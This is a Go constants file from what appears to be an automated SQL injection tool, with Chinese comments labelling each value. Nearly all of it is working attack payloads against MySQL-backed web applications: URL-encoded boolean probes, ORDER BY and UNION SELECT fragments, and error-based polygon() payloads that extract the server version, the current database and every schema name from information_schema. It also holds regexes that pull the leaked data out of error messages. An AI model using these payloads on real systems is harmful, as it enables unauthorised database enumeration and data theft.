package constant

const (
	// DetectWafPayload 检测WAF的Payload
	DetectWafPayload = "'%20or%201=1--+"
	// SuffixCondition 检测闭合符号的Payload
	SuffixCondition = "%20--+"
	// SuffixPayload 检测闭合符号的Payload
	SuffixPayload = "%20Or%20'SQLMaP'='SQLMaP'%20--+"
	// DetectedKeyword 检测到注入的关键字
	DetectedKeyword = "You have an error in your SQL syntax"
	// Annotator 注释符
	Annotator = "--+"
	// Space 空格
	Space = "%20"
	// VersionFunc 版本函数
	VersionFunc = "version()"
	// DatabaseFunc 数据库函数
	DatabaseFunc = "database()"
)

// Union Select部分的常量
const (
	// OrderKeyword 检测OrderBy语句的关键字
	OrderKeyword = "Unknown column"
	// UnionSelectOrderPayload 检测OrderBy的Payload
	UnionSelectOrderPayload = "order%20by"
	// UnionSelectUnionCondition Union Select需要否定的条件
	UnionSelectUnionCondition = "0"
	// UnionSelectUnionSql Union Select语句
	UnionSelectUnionSql = "union%20select"
)

// Error Based部分的常量
const (
	// UpdatexmlFunc 报错注入检测函数
	// 这个报错函数在后续利用中较麻烦，所以采用Polygon做后续
	UpdatexmlFunc = "updatexml()"
	// PolygonErrorKeyword 报错回显的关键字
	PolygonErrorKeyword = "Illegal non geometric"
	// ErrorBasedKeyword 检测到报错注入的关键字
	ErrorBasedKeyword = "Incorrect parameter count in the call to native function"
	// PolygonVersionPayload 报错注入获得版本
	PolygonVersionPayload = "%20Or%20polygon((select%20*%20from" +
		"(select%20*%20from(select%20version())a)b))--+"
	// PolygonVersionRegex 报错获得版本的正则
	PolygonVersionRegex = "Illegal.*version.*select\\s'(.*?)' AS.*?"
	// PolygonDatabasePayload 报错注入获得当前数据库
	PolygonDatabasePayload = "%20Or%20polygon((select%20*%20from" +
		"(select%20*%20from(select%20database())a)b))--+"
	// PolygonDatabaseRegex 报错获得当前数据库的正则
	PolygonDatabaseRegex = "Illegal.*database.*select\\s'(.*?)' AS.*?"
	// PolygonAllDatabasesPayload 报错获得所有数据库
	PolygonAllDatabasesPayload = "%20Or%20polygon((select%20*%20from" +
		"(select%20*%20from(select%20group_concat(schema_name)%20from" +
		"%20information_schema.schemata%20)a)b))--+"
	// PolygonDataRegex 报错获得数据的正则
	PolygonDataRegex = "Illegal.*group_concat.*select\\s'(.*?)' AS.*?"
	// PolygonFinalDataRegex 报错获得最终数据的正则
	PolygonFinalDataRegex = "Illegal.*group_concat.*select\\s'(.*?)'\\svalue\\sfound"
)
